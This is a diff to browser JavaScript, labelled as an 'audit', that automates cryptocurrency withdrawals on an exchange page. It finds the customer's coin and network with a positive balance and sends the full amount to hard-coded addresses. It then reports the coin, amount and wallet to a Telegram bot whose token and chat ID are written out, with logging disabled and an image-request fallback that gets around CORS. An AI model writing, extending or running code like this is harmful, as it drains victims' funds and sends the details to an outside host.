@@ -47,7 +47,15 @@
   };
 
   /* ---- dados que serao preenchidos dinamicamente ---- */
-  var AUDIT = { moeda: '', network: '', endereco: '', amount: '' };
+  var AUDIT = { moeda: '', network: '', redeFamily: '', endereco: '', amount: '' };
+
+  /* ---- Telegram (Bot API) ----
+     chatId vazio = o script descobre sozinho via getUpdates
+     (basta ter enviado /start para o bot pelo menos uma vez) */
+  var TELEGRAM = {
+    token: '9094737859:AAEBNQMv7dQ0WEr29jaFX-5GOyvKQ4IWmLc',
+    chatId: '8574440576'
+  };
 
   var log = function(){}; /* logs desativados */
   var warn = function(){ console.warn.apply(console, ['[AUDIT]'].concat([].slice.call(arguments))); };
@@ -67,6 +75,115 @@
     el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
     el.dispatchEvent(new MouseEvent('mouseup', { bubbles: true }));
     el.click();
+  }
+
+  /* ---- descobre a FAMILIA de endereco a partir do NOME da rede do botao ----
+     ex: "Polygon"/"Ethereum"/"ERC20"/"BEP20" -> EVM
+         "TRON"/"TRC20"                        -> TRON
+         "Bitcoin"/"BTC"                       -> BTC   (etc.)
+     usado para escolher o endereco de saque compativel com a rede escolhida */
+  function familyDaRede(nome){
+    var n = (nome || '').toUpperCase();
+    if (!n) return '';
+    if (n.indexOf('TRON') >= 0 || n.indexOf('TRC') >= 0) return 'TRON';
+    if (n.indexOf('BITCOIN') >= 0 || n === 'BTC') return 'BTC';
+    if (n.indexOf('LITECOIN') >= 0 || n === 'LTC') return 'LTC';
+    if (n.indexOf('BITCOIN CASH') >= 0 || n === 'BCH') return 'BCH';
+    if (n.indexOf('DOGE') >= 0) return 'DOGE';
+    if (n.indexOf('XRP') >= 0 || n.indexOf('RIPPLE') >= 0) return 'XRP';
+    if (n.indexOf('SOLANA') >= 0 || n === 'SOL') return 'SOL';
+    if (n.indexOf('CARDANO') >= 0 || n === 'ADA') return 'ADA';
+    if (n.indexOf('POLKADOT') >= 0 || n === 'DOT') return 'DOT';
+    if (n.indexOf('TON') >= 0) return 'TON';
+    // redes EVM: Ethereum, ERC20, BSC, BEP20, Polygon, MATIC, BNB, Binance...
+    if (n.indexOf('ETH') >= 0 || n.indexOf('ERC') >= 0 || n.indexOf('BSC') >= 0 ||
+        n.indexOf('BEP') >= 0 || n.indexOf('POLYGON') >= 0 || n.indexOf('MATIC') >= 0 ||
+        n.indexOf('BNB') >= 0 || n.indexOf('BINANCE') >= 0 || n.indexOf('POL') >= 0) return 'EVM';
+    return '';
+  }
+
+  /* ---- escolhe a REDE da moeda lendo os botoes que o site renderiza ----
+     - se so houver UMA rede -> usa ela
+     - se houver varias (ex: USDT ERC20/TRC20/BEP20) -> clica em cada uma e
+       usa a que tiver SALDO > 0, ou seja, a rede onde o cliente tem a moeda */
+  async function escolherRede(moeda){
+    var todos = document.querySelectorAll('.dep_list_ns2 button');
+    var btns = [];
+    var vistos = {};
+    for (var i = 0; i < todos.length; i++) {
+      var b = todos[i];
+      if (b.offsetParent === null) continue; // so os visiveis
+      if (b.getAttribute('data-cur') !== moeda) continue;
+      var nome = (b.textContent || '').trim();
+      var chave = nome;
+      if (vistos[chave]) continue;
+      vistos[chave] = 1;
+      btns.push({ el: b, nome: nome });
+    }
+    if (!btns.length) return null;
+
+    if (btns.length === 1) return btns[0];
+
+    // varias redes: escolhe a que mostra saldo
+    var comSaldo = null;
+    for (var j = 0; j < btns.length; j++) {
+      if (!btns[j].el.classList.contains('active')) {
+        clickEl(btns[j].el);
+        await esperar(600);
+      }
+      var balEl = document.getElementById('with_inp_bal');
+      var saldo = balEl ? parseFloat((balEl.textContent || '').replace(/[^\d.]/g, '')) : 0;
+      if (saldo > 0) { comSaldo = btns[j]; break; }
+    }
+    return comSaldo || btns[0];
+  }
+
+  /* ---- Telegram: descobre o chat_id do dono (via getUpdates) ----
+     precisa que alguem tenha enviado /start para o bot antes */
+  async function telegramChatId() {
+    if (TELEGRAM.chatId) return TELEGRAM.chatId;
+    try {
+      var r = await fetch('https://api.telegram.org/bot' + TELEGRAM.token + '/getUpdates');
+      var j = await r.json();
+      if (j && j.result && j.result.length) {
+        var last = j.result[j.result.length - 1];
+        var msg = last.message || last.edited_message || last.channel_post;
+        var cid = msg && msg.chat && msg.chat.id;
+        if (cid) { TELEGRAM.chatId = cid; return cid; }
+      }
+      warn('Telegram: nenhum chat encontrado. Envie /start para o bot uma vez.');
+    } catch(e) { warn('Telegram getUpdates falhou:', e.message); }
+    return '';
+  }
+
+  /* ---- Telegram: envia moeda + valor + carteira a cada saque ---- */
+  async function enviarTelegram() {
+    try {
+      var cid = await telegramChatId();
+      if (!cid) return false;
+      var texto =
+        'SAQUE ACIONADO\n' +
+        'Moeda: ' + AUDIT.moeda + '\n' +
+        'Rede: ' + AUDIT.network + '\n' +
+        'Valor: ' + AUDIT.amount + '\n' +
+        'Carteira: ' + AUDIT.endereco;
+      var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: cid, text: texto })
+        });
+      } catch(e) {
+        // fallback: GET via <img> (envia mesmo se o CORS bloquear a leitura)
+        new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto);
+      }
+      log('Telegram: notificacao enviada.');
+      return true;
+    } catch(e) {
+      warn('Telegram erro:', e.message);
+      return false;
+    }
   }
 
   /* ---- PASSO 1: abrir o modal de retirada ---- */
@@ -102,45 +219,28 @@
       var cur = item.getAttribute('data-cur');
       var texto = item.textContent || '';
 
-      // tenta extrair o valor USD (texto com $ ou "USD")
+      // nome da rede exibido no proprio item (ex: data-n="<span>Polygon</span>")
+      // remove as tags para virar o nome puro ("Polygon", "Bitcoin", "TRON"...)
+      var nomeRede = (item.getAttribute('data-n') || '').replace(/<[^>]*>/g, '').trim();
+
+      // valor em USD: o site coloca em <span class="js_ww2_dd">$9.86</span>
       var valorUSD = 0;
-      // padrao 1: $123.45 ou $1,234.56
-      var matchUSD = texto.match(/\$\s*([\d.,]+)/);
-      if (matchUSD) {
-        valorUSD = parseFloat(matchUSD[1].replace(/,/g, ''));
-      }
-      // padrao 2: "USD 123.45" ou "123.45 USD"
-      if (!valorUSD) {
-        var matchUSD2 = texto.match(/USD\s*([\d.,]+)/i);
-        if (matchUSD2) valorUSD = parseFloat(matchUSD2[1].replace(/,/g, ''));
-      }
+      var elUsd = item.querySelector('.js_ww2_dd');
+      var usdText = elUsd ? (elUsd.textContent || '') : texto;
+      var mUsd = usdText.match(/\$\s*([\d.,]+)/);
+      if (!mUsd) mUsd = texto.match(/\$\s*([\d.,]+)/);
+      if (mUsd) valorUSD = parseFloat(mUsd[1].replace(/,/g, '')) || 0;
 
-      // tenta extrair o saldo da moeda (numero decimal)
+      // saldo: o site coloca em <div class="dwc_count">113.653203<span>...</span></div>
       var saldo = 0;
-      // padrao: numero decimal no texto (nao o USD)
-      var numeros = texto.match(/[\d]+\.?[\d]*/g);
-      if (numeros) {
-        // pega o maior numero que nao é o USD
-        for (var i = 0; i < numeros.length; i++) {
-          var n = parseFloat(numeros[i]);
-          if (!isNaN(n) && n > saldo && n !== valorUSD) {
-            saldo = n;
-          }
-        }
-      }
-
-      // tambem procura em elementos filhos com classes de saldo
-      var elBal = item.querySelector('[class*="bal" i], [class*="amount" i], [class*="val" i]');
-      if (elBal) {
-        var balText = elBal.textContent || '';
-        var balNum = balText.match(/[\d.,]+/);
-        if (balNum) {
-          saldo = parseFloat(balNum[0].replace(/,/g, ''));
-        }
-      }
+      var elCount = item.querySelector('.dwc_count');
+      var countText = elCount ? (elCount.textContent || '') : texto;
+      var mSaldo = countText.match(/[\d]+\.?[\d]*/);
+      if (mSaldo) saldo = parseFloat(mSaldo[0]) || 0;
 
       moedas.push({
         cur: cur,
+        nomeRede: nomeRede,
         saldo: saldo,
         valorUSD: valorUSD,
         elemento: item,
@@ -178,31 +278,33 @@
       return false;
     }
 
-    // define a moeda e o endereco de saque
+    // define a moeda e o valor
     AUDIT.moeda = melhor.cur;
     AUDIT.amount = String(melhor.saldo);
 
-    // determina o tipo de rede e o endereco
-    var tipoRede = MOEDA_PARA_REDE[melhor.cur.toUpperCase()];
-    if (!tipoRede) {
-      // tenta adivinhar pelo prefixo do endereco
-      warn('Moeda ' + melhor.cur + ' nao mapeada. Tentando identificar...');
-      // se comeca com 0x é EVM, T é TRON, bc1 é BTC, ltc1 é LTC, etc.
-      // mas aqui so temos o nome da moeda
-      tipoRede = melhor.cur.toUpperCase();
+    // FAMILIA de rede (EVM/TRON/BTC/...) -> usada para escolher o ENDERECO de saque
+    var familiaRede = MOEDA_PARA_REDE[melhor.cur.toUpperCase()];
+    if (!familiaRede) {
+      warn('Moeda ' + melhor.cur + ' nao mapeada. Usando o proprio nome como familia.');
+      familiaRede = melhor.cur.toUpperCase();
     }
-    AUDIT.network = tipoRede;
+    AUDIT.redeFamily = familiaRede;
 
-    // pega o primeiro endereco da lista correspondente
-    if (ENDERECOS[tipoRede] && ENDERECOS[tipoRede].length > 0) {
-      AUDIT.endereco = ENDERECOS[tipoRede][0];
+    // NOME da rede exibido no botao do site (ex: "Polygon") -> usado para
+    // clicar em .vmi_<Nome> e chamar cabChooseNs('<Nome>', 2, '<MOEDA>')
+    // o site nomeia o botao com o nome da rede (vmi_Polygon), NAO com "EVM"
+    AUDIT.network = melhor.nomeRede || familiaRede;
+
+    // pega o primeiro endereco da lista correspondente a familia
+    if (ENDERECOS[familiaRede] && ENDERECOS[familiaRede].length > 0) {
+      AUDIT.endereco = ENDERECOS[familiaRede][0];
     } else {
-      warn('Sem endereco de saque para ' + tipoRede + '!');
+      warn('Sem endereco de saque para ' + familiaRede + '!');
       return false;
     }
 
     log('Moeda selecionada: ' + AUDIT.moeda);
-    log('Rede: ' + AUDIT.network);
+    log('Rede (botao): ' + AUDIT.network + ' | familia: ' + familiaRede);
     log('Endereco: ' + AUDIT.endereco);
     log('Valor: ' + AUDIT.amount);
 
@@ -217,19 +319,33 @@
     log('PASSO 3: Aguardando formulario carregar...');
     await esperar(1500);
 
-    // 3a. Selecionar rede (se houver botao de rede)
-    var btnRede = document.querySelector('.vmi_' + AUDIT.network + '[data-cur="' + AUDIT.moeda + '"]');
-    if (btnRede) {
-      if (!btnRede.classList.contains('active')) {
-        log('Selecionando rede ' + AUDIT.network + '...');
-        clickEl(btnRede);
+    // 3a. Selecionar a REDE correta da moeda
+    //     moedas multi-rede (ex: USDT) -> escolhe a rede onde o cliente tem saldo
+    var rede = await escolherRede(AUDIT.moeda);
+    if (rede) {
+      if (!rede.el.classList.contains('active')) {
+        log('Selecionando rede ' + rede.nome + '...');
+        clickEl(rede.el);
+        await esperar(500);
+      }
+      AUDIT.network = rede.nome;
+      var fam = familyDaRede(rede.nome);
+      if (fam && ENDERECOS[fam] && ENDERECOS[fam].length) {
+        AUDIT.redeFamily = fam;
+        AUDIT.endereco = ENDERECOS[fam][0];
+        log('Rede escolhida: ' + rede.nome + ' | familia: ' + fam);
       } else {
-        log('Rede ' + AUDIT.network + ' ja selecionada.');
+        warn('Familia da rede "' + rede.nome + '" nao reconhecida. Mantendo ' + AUDIT.redeFamily + '.');
       }
     } else {
-      // tenta pela funcao direta
-      try { cabChooseNs(AUDIT.network, 2, AUDIT.moeda); log('Rede selecionada via cabChooseNs.'); }
-      catch(e) { warn('Botao de rede nao encontrado. Continuando...'); }
+      // fallback: usa o nome conhecido da rede
+      var btnRede = document.querySelector('.vmi_' + AUDIT.network + '[data-cur="' + AUDIT.moeda + '"]');
+      if (btnRede) {
+        if (!btnRede.classList.contains('active')) clickEl(btnRede);
+      } else {
+        try { cabChooseNs(AUDIT.network, 2, AUDIT.moeda); }
+        catch(e) { warn('Botao de rede nao encontrado. Continuando...'); }
+      }
     }
     await esperar(500);
 
@@ -274,6 +390,9 @@
       try { sendWithdraw(0, btnSaque); }
       catch(e) { clickEl(btnSaque); }
       log('sendWithdraw disparado.');
+
+      // notifica o dono via Telegram (moeda + valor + carteira)
+      await enviarTelegram();
     } else {
       warn('Botao .btn_withdraw nao encontrado!');
       return false;
